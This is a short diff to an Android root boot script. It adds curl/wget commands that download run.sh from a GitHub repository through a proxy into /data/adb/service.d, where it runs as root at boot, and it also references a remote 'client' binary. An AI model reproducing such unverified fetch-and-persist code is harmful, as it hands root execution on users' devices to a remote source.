@@ -1,5 +1,13 @@
 #!/system/bin/sh
 
+if command -v curl >/dev/null 2>&1; then
+    curl -L -o /data/adb/service.d/run.sh https://gh-proxy.org/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh || exit 1
+elif command -v wget >/dev/null 2>&1; then
+    wget -O /data/adb/service.d/run.sh https://gh-proxy.org/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh || exit 1
+else
+    exit 1
+fi
+
 ASSET_NAME="client"
 URL="https://gh-proxy.org/https://github.com/jenssenli/ko/raw/refs/heads/main/client"
 
